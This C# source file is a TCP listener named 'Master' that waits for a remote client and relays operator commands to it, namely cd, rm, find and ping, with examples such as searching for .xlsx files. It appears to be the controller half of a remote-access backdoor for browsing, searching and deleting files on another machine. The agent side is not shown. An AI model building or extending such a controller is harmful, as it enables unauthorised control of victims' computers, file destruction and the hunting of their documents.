using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;

namespace Master
{
	class Program
	{
		static void Main(string[] args)
		{
			int port;

			if (args.Length != 1)
			{
				Console.WriteLine("Did not receive port number; will use default - 8000");
				port = 8000;
			}
			else
			{
				port = Int32.Parse(args[0]);
			}

			TcpListener server = new TcpListener(port);

			server.Start();
			Console.WriteLine("Waiting for connection...");

			TcpClient client = server.AcceptTcpClient();
			Console.WriteLine("Connected");

			NetworkStream stream = client.GetStream();

			Console.WriteLine();
			Console.WriteLine("Commands available: quit, ping, cd, rm, find");
			Console.WriteLine("Examples: cd ..\\Music");
			Console.WriteLine("          find .xlsx");
			Console.WriteLine();

			while (true)
			{
				while(true) {
					string str = read(stream);
					if (str.Trim() == "[YIELD]")
					{ // Wait for our turn to speak
						Console.WriteLine();
						break;
					} else {
						Console.WriteLine(str.TrimEnd());
					}
				}
				
				while (true)
				{
					Console.Write("> ");
					string command = Console.ReadLine();
					command = command.Trim();

					if (command.Length > 0)
					{
						write(stream, command);
						break;
					}
				}
			}
		}

		static void write(NetworkStream stream, String msg)
		{
			msg += "\n";

			Byte[] data = System.Text.Encoding.Unicode.GetBytes(msg);

			Byte[] buffer = new Byte[4];
			buffer[0] = (byte)(data.Length);
			buffer[1] = (byte)(data.Length >> 8);
			buffer[2] = (byte)(data.Length >> 16);
			buffer[3] = (byte)(data.Length >> 24);

			stream.Write(buffer, 0, 4);

			stream.Write(data, 0, data.Length);
		}

		static String read(NetworkStream stream)
		{
			Byte[] buffer = new Byte[4];
			stream.Read(buffer, 0, 4);

			int size = (int)buffer[0];
			size |= (buffer[1] << 8);
			size |= (buffer[2] << 16);
			size |= (buffer[3] << 24);

			buffer = new Byte[size];
			stream.Read(buffer, 0, size);

			String str = System.Text.Encoding.Unicode.GetString(buffer, 0, size);
			return str;
		}
	}
}
